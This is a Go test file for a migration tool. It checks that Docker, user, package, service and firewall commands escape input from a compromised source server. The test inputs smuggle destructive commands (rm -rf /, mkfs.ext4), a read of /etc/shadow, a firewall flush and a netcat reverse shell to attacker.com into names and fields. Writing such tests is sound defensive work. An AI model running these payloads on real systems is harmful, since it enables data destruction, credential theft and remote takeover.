package migration

import (
	"context"
	"encoding/json"
	"io"
	"strings"
	"testing"
)

// TestCommandInjectionPrevention verifies that malicious input from a
// compromised source server cannot inject shell commands during migration.
// This is a critical security test that validates the shell escaping
// fixes applied to all migration category modules.

func TestDockerCommandInjectionPrevention(t *testing.T) {
	// Malicious container ID that attempts command injection
	maliciousID := "abc123; rm -rf /"
	// Malicious image name with injection attempt
	maliciousImage := "nginx; cat /etc/shadow"
	// Malicious volume name
	maliciousVolume := "data; mkfs.ext4 /dev/sda"

	applier := &DockerApplier{}
	dd := DockerData{
		Containers: []DockerContainer{
			{
				ID:    maliciousID,
				Name:  "test-container",
				Image: maliciousImage,
			},
		},
		Images:  []string{maliciousImage},
		Volumes: []DockerVolume{{Name: maliciousVolume}},
	}
	raw, _ := json.Marshal(dd)

	var execCommands []string
	mockSSH := &injectionTestSSH{
		execCommands: &execCommands,
	}

	err := applier.Apply(context.Background(), mockSSH, CategoryData{Type: "docker", Data: raw}, nil)
	if err != nil {
		// Docker not installed is expected in test
		if !strings.Contains(err.Error(), "docker is not installed") {
			t.Logf("Apply returned error (expected for mock): %v", err)
		}
	}

	// Verify no raw injection attempts in any executed command
	for _, cmd := range execCommands {
		if strings.Contains(cmd, "rm -rf /") && !strings.Contains(cmd, "'abc123; rm -rf /'") {
			t.Errorf("INJECTION DETECTED: rm -rf / found unescaped in command: %s", cmd)
		}
		if strings.Contains(cmd, "cat /etc/shadow") && !strings.Contains(cmd, "'nginx; cat /etc/shadow'") {
			t.Errorf("INJECTION DETECTED: cat /etc/shadow found unescaped in command: %s", cmd)
		}
		if strings.Contains(cmd, "mkfs.ext4") && !strings.Contains(cmd, "'data; mkfs.ext4 /dev/sda'") {
			t.Errorf("INJECTION DETECTED: mkfs.ext4 found unescaped in command: %s", cmd)
		}
	}
}

func TestUsersCommandInjectionPrevention(t *testing.T) {
	// Malicious user name with injection attempt
	maliciousUser := "appuser; useradd evil"
	// Malicious home directory
	maliciousHome := "/home/appuser; chmod 777 /"
	// Malicious shell
	maliciousShell := "/bin/bash; nc -e /bin/sh attacker.com 4444"

	applier := &UsersApplier{}
	ud := UsersData{
		Users: []UserData{
			{
				Name:    maliciousUser,
				UID:     1000,
				GID:     1000,
				HomeDir: maliciousHome,
				Shell:   maliciousShell,
			},
		},
		Groups: []GroupData{
			{Name: "appgroup; groupadd evil", GID: 1000},
		},
	}
	raw, _ := json.Marshal(ud)

	var execCommands []string
	mockSSH := &injectionTestSSH{
		execCommands: &execCommands,
	}

	err := applier.Apply(context.Background(), mockSSH, CategoryData{Type: "users", Data: raw}, nil)
	if err != nil {
		t.Fatalf("Apply failed: %v", err)
	}

	// Verify all injection attempts are properly escaped
	for _, cmd := range execCommands {
		// Check that injection attempts are quoted, not interpreted
		if strings.Contains(cmd, "useradd evil") && !strings.Contains(cmd, "'appuser; useradd evil'") {
			t.Errorf("INJECTION DETECTED: useradd evil found unescaped in command: %s", cmd)
		}
		if strings.Contains(cmd, "chmod 777 /") && !strings.Contains(cmd, "'/home/appuser; chmod 777 /'") {
			t.Errorf("INJECTION DETECTED: chmod 777 / found unescaped in command: %s", cmd)
		}
		if strings.Contains(cmd, "nc -e") && !strings.Contains(cmd, "'/bin/bash; nc") {
			t.Errorf("INJECTION DETECTED: reverse shell found unescaped in command: %s", cmd)
		}
		if strings.Contains(cmd, "groupadd evil") && !strings.Contains(cmd, "'appgroup; groupadd evil'") {
			t.Errorf("INJECTION DETECTED: groupadd evil found unescaped in command: %s", cmd)
		}
	}
}

func TestDistroAdapterCommandInjectionPrevention(t *testing.T) {
	// Malicious package name with injection
	maliciousPkg := "nginx; rm -rf /"
	// Malicious service name with injection
	maliciousSvc := "sshd; systemctl stop firewall"

	adapters := []DistroAdapter{
		&aptAdapter{},
		&dnfAdapter{},
		&pacmanAdapter{},
		&apkAdapter{},
		&zypperAdapter{},
	}

	for _, adapter := range adapters {
		installCmd := adapter.InstallPackages([]string{maliciousPkg})
		if strings.Contains(installCmd, "rm -rf /") && !strings.Contains(installCmd, "'nginx; rm -rf /'") {
			t.Errorf("INJECTION in %s.InstallPackages: %s", adapter.PackageManager(), installCmd)
		}

		removeCmd := adapter.RemovePackages([]string{maliciousPkg})
		if strings.Contains(removeCmd, "rm -rf /") && !strings.Contains(removeCmd, "'nginx; rm -rf /'") {
			t.Errorf("INJECTION in %s.RemovePackages: %s", adapter.PackageManager(), removeCmd)
		}

		enableCmd := adapter.EnableService(maliciousSvc)
		if strings.Contains(enableCmd, "systemctl stop firewall") && !strings.Contains(enableCmd, "'sshd; systemctl stop firewall'") {
			t.Errorf("INJECTION in %s.EnableService: %s", adapter.PackageManager(), enableCmd)
		}

		startCmd := adapter.StartService(maliciousSvc)
		if strings.Contains(startCmd, "systemctl stop firewall") && !strings.Contains(startCmd, "'sshd; systemctl stop firewall'") {
			t.Errorf("INJECTION in %s.StartService: %s", adapter.PackageManager(), startCmd)
		}
	}
}

func TestFirewallInjectionPrevention(t *testing.T) {
	// Malicious firewall rules that attempt to break out of heredoc
	maliciousFirewall := `*filter
:INPUT ACCEPT [0:0]
COMMIT
EOF
iptables -F
iptables -P INPUT ACCEPT
echo 'pwned' > /tmp/hacked`

	applier := &UsersApplier{}
	ud := UsersData{
		Firewall: maliciousFirewall,
	}
	raw, _ := json.Marshal(ud)

	var execCommands []string
	mockSSH := &injectionTestSSH{
		execCommands: &execCommands,
	}

	err := applier.Apply(context.Background(), mockSSH, CategoryData{Type: "users", Data: raw}, nil)
	if err != nil {
		t.Fatalf("Apply failed: %v", err)
	}

	// The firewall content should be base64-encoded, not passed raw
	for _, cmd := range execCommands {
		if strings.Contains(cmd, "iptables-restore") {
			// Should use base64 encoding, not raw heredoc
			if strings.Contains(cmd, "iptables -F") && !strings.Contains(cmd, "base64") {
				t.Errorf("INJECTION DETECTED: firewall content not base64-encoded: %s", cmd)
			}
			if strings.Contains(cmd, "echo 'pwned'") && !strings.Contains(cmd, "base64") {
				t.Errorf("INJECTION DETECTED: firewall injection not base64-encoded: %s", cmd)
			}
		}
	}
}

// injectionTestSSH is a mock SSH that records all executed commands
// for injection analysis.
type injectionTestSSH struct {
	execCommands *[]string
	alive        bool
}

func (m *injectionTestSSH) Exec(cmd string) (string, string, int, error) {
	*m.execCommands = append(*m.execCommands, cmd)
	// Return "docker not found" for docker checks
	if strings.Contains(cmd, "which docker") {
		return "", "", 1, nil
	}
	return "", "", 0, nil
}

func (m *injectionTestSSH) ExecContext(ctx context.Context, cmd string) (string, string, int, error) {
	return m.Exec(cmd)
}

func (m *injectionTestSSH) IsAlive() bool { return true }

func (m *injectionTestSSH) Upload(src io.Reader, remotePath string) error {
	return nil
}

func (m *injectionTestSSH) Download(remotePath string, dst io.Writer) error {
	return nil
}
